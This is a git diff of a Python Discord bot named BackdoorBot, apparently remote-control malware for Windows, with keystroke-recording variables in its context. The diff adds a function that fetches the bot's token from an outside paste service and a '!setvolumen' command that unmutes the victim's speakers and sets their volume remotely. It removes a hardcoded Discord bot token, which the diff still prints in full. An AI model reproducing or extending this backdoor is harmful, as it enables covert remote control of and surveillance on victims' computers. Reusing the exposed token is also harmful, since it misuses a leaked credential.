@@ -4,14 +4,26 @@ import io
 import subprocess, threading
 import playsound, winsound
 import os, tempfile
+import requests
+from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
+from ctypes import cast, POINTER
+from comtypes import CLSCTX_ALL
 
 temp_dir = tempfile.gettempdir()
 recording = False
 recorded_keys = []
 recording_thread = None
 
+def fetch_token():
+    response = requests.get("https://api.npoint.io/db9d3767c9e0cb7889a4")
+    if response.status_code == 200:
+        data = response.json()
+        return data.get("token", "")
+    else:
+        raise Exception("Error al obtener el token de la API")
+
 def download_audio(url, filename):
-    import requests
+    
     response = requests.get(url)
     with open(os.path.join(temp_dir, filename), 'wb') as file:
         try:
@@ -154,11 +166,27 @@ class BackdoorBot(discord.Client):
         elif message.content.startswith("!removeaudio"):
             filename = os.path.join(tempfile.gettempdir(), "ANASHEIGODANASHEIAUDIOANASHEI.mp3")
             os.remove(filename)
+        elif message.content.startswith('!setvolumen'):
+            try:
+                volume = int(message.content.split(" ")[1])
+                if 0 <= volume <= 100:
+                    devices = AudioUtilities.GetSpeakers()
+                    interface = devices.Activate(
+                        IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
+                    volume_control = cast(interface, POINTER(IAudioEndpointVolume))
+                    volume_control.SetMute(0, None)
+                    volume_control.SetMasterVolumeLevelScalar(volume / 100.0, None)
+            
+                    await message.channel.send(f"Volumen establecido a {volume}%.")
+                else:
+                    await message.channel.send("El volumen debe estar entre 0 y 100.")
+            except ValueError:
+                await message.channel.send("Por favor, proporciona un número válido para el volumen.")
             
 
 
     def run_bot(self):
         self.run(self.token)
-
-bot = BackdoorBot("MTM3NjYwMDU2MjAxOTIwOTQyNw.GaioMq.0qIeJaupOM7ZQhWXS9_taLO8YM8L03YwwfhT5U")
+token = fetch_token()
+bot = BackdoorBot(token)
 bot.run_bot()
